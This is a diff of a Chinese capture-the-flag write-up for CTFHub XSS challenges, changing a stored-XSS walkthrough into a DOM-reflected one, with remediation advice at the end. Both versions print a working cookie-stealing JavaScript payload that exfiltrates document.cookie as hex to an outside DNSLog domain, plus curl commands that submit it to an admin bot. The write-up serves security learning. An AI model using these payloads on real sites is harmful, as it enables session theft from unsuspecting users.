@@ -16,100 +16,97 @@ WEB
 ## 0x01 题目信息
 | 项目 | 内容 |
 | --- | --- |
-| 题目名称 | CTFHub 技能学习 - 存储型 XSS（XSS Persistent） |
-| 靶场地址 | `http://challenge-399ed4cf5a94c8db.sandbox.ctfhub.com:10800` |
-| 注入位置 | POST 参数 `name` |
-| 存储方式 | 服务端保存，`GET /` 时回显 |
-| 回显位置 | `<h1>Hello, <%-name%></h1>`，未转义 |
-| 获取方式 | Bot 访问首页自动触发，偷 `flag` Cookie |
-| Flag | `ctfhub{74e44afc8e0b3793245bda71}` |
+| 题目名称 | CTFHub 技能学习 - DOM 型反射 XSS（XSS DOM Reflex） |
+| 靶场地址 | `http://challenge-65a12cafd8b4da2f.sandbox.ctfhub.com:10800` |
+| 注入位置 | GET 参数 `text` |
+| 触发点 | 内联 JS 的 `innerHTML` 赋值 |
+| 关键问题 | `text` 被拼进单引号字符串，且没有转义 |
+| 获取方式 | 闭合字符串注入 JS，偷 Bot 的 `flag` Cookie |
+| Flag | `ctfhub{38b0acecad34460c4bd07d0a}` |
 ## 0x02 漏洞原理
-存储型 XSS 和反射型的区别在于：**payload 会被服务端保存下来**。
-反射型需要诱导受害者点击一个带 payload 的链接；存储型则是一次写入、长期生效——所有访问这个页面的用户都会中招，包括管理员。危害更大，利用也更简单：只要让 Bot 访问一次正常页面，不需要它点任何东西。
-本题的流程是：
-1. 页面有一个「Change name」表单，`POST name=...` 提交后，服务端把 `name` 保存下来；
-2. 之后任何人访问 `GET /`，页面都会渲染：
+DOM 型 XSS 和反射型、存储型最大的区别是：**数据不经过服务端渲染，而是在浏览器里被 JavaScript 写进页面**。
+常见的数据流是：
+```
+location.search / location.hash  →  JS 处理  →  innerHTML / document.write
+```
+`location` 是 source（来源），`innerHTML` 是 sink（汇点），只要 source 的内容没经过滤就进了 sink，就会执行。
+本题的页面结构是：
 ```html
-<h1>Hello, <%-name%>
-```
-3. EJS 的 `<%-` 是原样输出，不做 HTML 转义，于是保存的内容会被当成代码执行。
-页面下方同样有「Send URL to Bot」，Bot 以管理员身份访问 URL，它的浏览器里存着：
-```
-flag=ctfhub{...}
-```
-所以目标是：把偷 Cookie 的脚本存进去，再让 Bot 访问首页触发。
-## 0x03 解题过程
-**3.1 找存储点**
-首页表单：
-```html
-<form action="" method="POST">
-    <input type="text" name="name" />
-</form>
-```
-先提交一个普通值：
-```
-curl -X POST --data-urlencode "name=mark123" http://challenge-399ed4cf5a94c8db.sandbox.ctfhub.com:10800/
-```
-注意 POST 的响应可能只是跳转，真正要看的是之后的 `GET /`：
-```
-curl http://challenge-399ed4cf5a94c8db.sandbox.ctfhub.com:10800/
-回显：Hello, mark123
-```
-说明 `name` 确实被存储了。
-**3.2 确认未转义**
-把值换成带标签的：
-```
-name=<b>mark123</b>
-```
-再访问首页：
-```
-<h1>Hello, <b>mark123</b>
-```
-标签原样输出、加粗生效，说明存储和渲染都没有转义，可以写入脚本。
-顺带确认：不带任何 Cookie 访问也能看到这个值，说明它存在服务端，对所有访问者生效——正好适合存储型 XSS。
-**3.3 构造偷 Cookie 的 payload**
-目标还是 Bot 的 `flag` Cookie，用 DNSLog 外带。为了避免 DNS 大小写和长度的问题，这里把 Cookie 转成十六进制，再拆成两段：
-```html
+<p id="text"></p>
 <script>
-h=document.cookie.split('').map(c=>('0'+c.charCodeAt(0).toString(16)).slice(-2)).join('');
-i=new Image();
-i.src='http://'+h.slice(0,50)+'.'+h.slice(50)+'.q8clvj.dnslog.cn/x'
+    $("#text")[0].innerHTML = 'CTFHub is very niubility';
 </script>
 ```
-关键点：
-- `document.cookie` 取到 `flag=ctfhub{...}`；
-- 每个字符转两位十六进制，拼成一个长串；
-- `slice(0,50)` 和 `slice(50)` 把长串拆成两个 DNS label，避免超过 63 字符；
-- 域名部分要写在引号里，和前面的字符串拼接成完整 URL。
-**3.4 写入并验证**
-把 payload 作为 `name` 提交：
+服务端把 `text` 参数**直接拼进了 `<script>` 里的单引号字符串**：
+```php
+$("#text")[0].innerHTML = '<?= $_GET['text'] ?>';
 ```
-curl -X POST --data-urlencode "name=<script>...</script>" http://challenge-.../
+也就是说，输入先进入了 JavaScript 字符串，再被赋给 `innerHTML`。只要能让字符串提前闭合，就能在页面里执行任意 JS。
+## 0x03 解题过程
+**3.1 找注入点**
+访问首页会 302 到：
 ```
-再 `GET /` 确认页面里出现了完整的 `<script>...</script>`，没有被转义或截断。
+/?text=CTFHub%20is%20very%20niubility
+```
+页面回显 `Hello, CTFHub`，下面有一段脚本：
+```javascript
+$("#text")[0].innerHTML = 'CTFHub is very niubility';
+```
+`text` 的内容被放进了单引号里。这就是注入点。
+**3.2 测试引号是否转义**
+提交一个带单引号的值：
+```
+?text=abc'def
+```
+页面里的脚本变成：
+```javascript
+$("#text")[0].innerHTML = 'abc'def';
+```
+单引号原样输出，没有转义成 `\'`，字符串被提前闭合，后面的 `def';` 变成了语法错误。这说明只要构造好闭合，就能注入代码。
+**3.3 构造 payload**
+思路是：先用 `'` 闭合字符串，加分号结束语句，然后写自己的 JS，最后用 `//` 把剩下的 `';` 注释掉。
+payload 结构：
+```javascript
+';h=document.cookie...;i=new Image();i.src='http://...'//
+```
+拼进页面后变成：
+```javascript
+$("#text")[0].innerHTML = '';h=...;i=...;i.src='http://...'//';
+```
+`//` 把结尾的 `';` 注释掉，整段就合法了。
+**3.4 构造外带脚本**
+目标还是 Bot 的 `flag` Cookie，用 DNSLog 外带。Cookie 转十六进制、拆成两个 label：
+```javascript
+';h=document.cookie.split('').map(c=>('0'+c.charCodeAt(0).toString(16)).slice(-2)).join('');i=new Image();i.src='http://'+h.slice(0,50)+'.'+h.slice(50)+'.q8clvj.dnslog.cn/x'//
+```
+验证渲染结果：
+```javascript
+$("#text")[0].innerHTML = '';h=document.cookie.split('').map(c=>('0'+c.charCodeAt(0).toString(16)).slice(-2)).join('');i=new Image();i.src='http://'+h.slice(0,50)+'.'+h.slice(50)+'.q8clvj.dnslog.cn/x'//';
+```
+字符串已经闭合，后面是我们的代码，最后的 `';` 被 `//` 注释掉，语法正确。
 **3.5 提交给 Bot**
-这次不需要构造带参数的恶意链接，直接提交首页即可：
+payload 做 URL 编码后拼到 `text=`，再提交给 `/submit`：
 ```
-curl -X POST --data-urlencode "url=http://challenge-399ed4cf5a94c8db.sandbox.ctfhub.com:10800/" \
-  http://challenge-399ed4cf5a94c8db.sandbox.ctfhub.com:10800/submit
+curl -X POST --data-urlencode "url=http://challenge-...:10800/?text=<编码后的payload>" \
+  http://challenge-...:10800/submit
 ```
 返回：
 ```json
 {"code": 0, "msg": "Successfully"}
 ```
-Bot 访问首页后，页面里的存储型脚本自动执行。
+Bot 访问这个 URL，页面加载时内联脚本执行，Cookie 被发出去。
 **3.6 接收并解码**
 几秒后查询 DNSLog，拿到记录：
 ```
-666c61673d6374666875627b37346534346166633865306233.37393332343562646137317d.q8clvj.dnslog.cn
+666c61673d6374666875627b33386230616365636164333434.36306334626430376430617d.q8clvj.dnslog.cn
 ```
 把两段十六进制拼起来解码：
 ```
-flag=ctfhub{74e44afc8e0b3793245bda71}
+flag=ctfhub{38b0acecad34460c4bd07d0a}
 ```
 得到 Flag：
 ```
-ctfhub{74e44afc8e0b3793245bda71}
+ctfhub{38b0acecad34460c4bd07d0a}
 ```
 **3.7 验证**
 - 十六进制解码后是完整的 `flag=ctfhub{...}`，没有截断；
@@ -118,33 +115,33 @@ ctfhub{74e44afc8e0b3793245bda71}
 ## 0x04 完整流程
 | 步骤 | 操作 | 结果 |
 | --- | --- | --- |
-| 找存储点 | `POST name=mark123` | 首页回显 `mark123` |
-| 确认未转义 | `name=<b>mark123</b>` | 标签原样输出 |
-| 写入 payload | `POST name=<script>...</script>` | 存储在服务端 |
-| 验证 | `GET /` | 页面包含完整脚本 |
-| 提交 Bot | `POST /submit` 表单 `url=首页` | `code:0 Successfully` |
+| 找注入点 | `?text=abc'def` | 脚本里字符串被提前闭合 |
+| 构造 payload | `';...//` | 闭合字符串并注入代码 |
+| 验证渲染 | 查看 `innerHTML` 那一行 | 语法正确 |
+| 提交 Bot | `POST /submit` 表单 `url=...` | `code:0 Successfully` |
 | 接收 | DNSLog 子域名记录 | 拿到十六进制串 |
-| 解码 | 十六进制转 ASCII | `flag=ctfhub{74e44afc8e0b3793245bda71}` |
-整条链路可以概括为：**找到会持久化回显的输入 → 写入偷 Cookie 的脚本 → 让 Bot 访问正常页面 → DNSLog 外带 → 解码。**
+| 解码 | 十六进制转 ASCII | `flag=ctfhub{38b0acecad34460c4bd07d0a}` |
+整条链路可以概括为：**确认输入进了 JS 字符串 → 用单引号闭合 → 注入外带脚本并用 `//` 注释尾部 → 提交 Bot → DNSLog 接收 → 解码。**
 ## 0x05 踩坑记录
-1. **POST 的响应看不到回显**：提交后返回的可能只是跳转，必须再 `GET /` 才能确认存储结果，别以为没写进去。
-2. **先验证存储范围**：本题不带 Cookie 也能看到值，说明是全局存储；如果只在自己的会话里能看到，就要考虑 Bot 访问时是否带得到。
-3. **JS 字符串拼接容易写错**：`'.'+domain+'/x'` 会让域名变成未定义的标识符，正确写法是把域名放进同一对引号里：`'.q8clvj.dnslog.cn/x'`。这个错误不会报在页面上，只会表现为 DNS 完全没有记录。
-4. **DNS 不区分大小写**：base64 里的字母会被归一，解出来是乱码，所以外带统一用十六进制。
-5. **DNS label 最长 63 字符**：Cookie 转 hex 后长度会超，必须拆成两段甚至多段。
-6. **存储型不需要诱导点击**：提交首页 URL 给 Bot 就行，payload 已经存在页面里，Bot 一访问就执行。
-7. **提交接口有 5 秒限速**：连续提交会返回 `Wait a while (5s)`，等一会儿再发。
+1. **注入点在 JS 字符串里，不在 HTML 标签里**：这题直接写 `<script>alert(1)</script>` 没用，因为它会被当成字符串内容赋给 `innerHTML`；要先闭合单引号。
+2. **单引号没有转义**：`abc'def` 会变成 `'abc'def'`，这是整个漏洞的突破口。如果服务端用 `json_encode` 或转义了引号，就不能这么打。
+3. **`//` 要放在最后**：payload 结尾的 `';` 是模板自带的，必须注释掉，否则语法错误。
+4. **payload 里的引号不用再转义**：闭合成 `'';` 之后，后面的单引号、双引号都在字符串外，正常写就行。
+5. **payload 要先 URL 编码**：直接把 `'`、`;`、`//` 拼进 URL，Bot 侧可能处理不好，先 `EscapeDataString`。
+6. **DNS 不区分大小写**：base64 会被归一成乱码，外带统一用十六进制。
+7. **DNS label 最长 63 字符**：Cookie 转 hex 后会超长，必须拆成两段。
+8. **提交接口有 5 秒限速**：连续提交会返回 `Wait a while (5s)`，等一会儿再发。
 ## 0x06 修复建议
-1. **输出编码**：把 `<%- name %>` 改成 `<%= name %>`，对 `<`、`>`、`"`、`'` 做 HTML 实体编码。
-2. **写入前过滤**：对 `name` 做白名单校验，拒绝 `<`、`>` 和事件属性；富文本场景要用成熟的白名单过滤库。
-3. **加 CSP**：设置 `Content-Security-Policy`，禁止内联脚本和外部脚本加载，即使注入成功也难以执行。
-4. **Cookie 加 HttpOnly**：给 `flag` 这类敏感 Cookie 设置 `HttpOnly`，JS 读不到 `document.cookie`。
-5. **存储型数据要当作不可信内容**：入库时转义、出库时编码，两个环节都不能省。
-6. **Bot 侧隔离**：管理员的浏览器不要访问不可信页面，或至少在无敏感 Cookie 的独立会话里访问。
+1. **不要把用户输入拼进 `<script>`**：需要给 JS 传值时，用 `json_encode` 输出，或者放到 `data-*` 属性里由 JS 读取，不要直接拼字符串。
+2. **用 `textContent` 代替 `innerHTML`**：本题只是显示文本，`textContent` 不会解析 HTML，天然免疫 XSS。
+3. **输出编码**：对 `<`、`>`、`"`、`'`、`&` 做 HTML 实体编码。
+4. **加 CSP**：设置 `Content-Security-Policy`，禁止内联脚本，即使注入成功也难以执行。
+5. **Cookie 加 HttpOnly**：给 `flag` 这类敏感 Cookie 设置 `HttpOnly`，JS 读不到 `document.cookie`。
+6. **Bot 侧隔离**：管理员的浏览器不要访问不可信 URL，或至少在无敏感 Cookie 的独立会话里访问。
 ## 0x07 总结
-存储型 XSS 的利用链比反射型更短：
-1. 找到会持久化保存、并且原样输出的输入点；
-2. 写入偷 Cookie 的脚本；
-3. 让 Bot 访问这个正常页面，脚本自动执行；
-4. 从外带通道还原 Cookie。
-它最危险的地方在于「一次写入、所有访问者中招」，不需要任何诱导点击。防御上，输出编码依然是根本，CSP 和 HttpOnly 是兜底；而像本题这样把用户输入直接存库、再原样渲染，等于把 XSS 做成了持久化后门。
+DOM 型 XSS 考的是「数据流」：
+- 先找 source：`location.search` 里的 `text`；
+- 再找 sink：`innerHTML`；
+- 中间没有任何过滤，输入就能变成代码。
+本题的特殊之处是：输入先被服务端拼进了 `<script>` 的字符串，再进入 `innerHTML`。所以第一步不是写标签，而是**闭合字符串**——一个单引号加 `//` 注释，就能把整段脚本接管。
+防御上，最直接的是别把用户输入拼进脚本、显示文本用 `textContent`；再配合输出编码、CSP 和 HttpOnly 兜底。
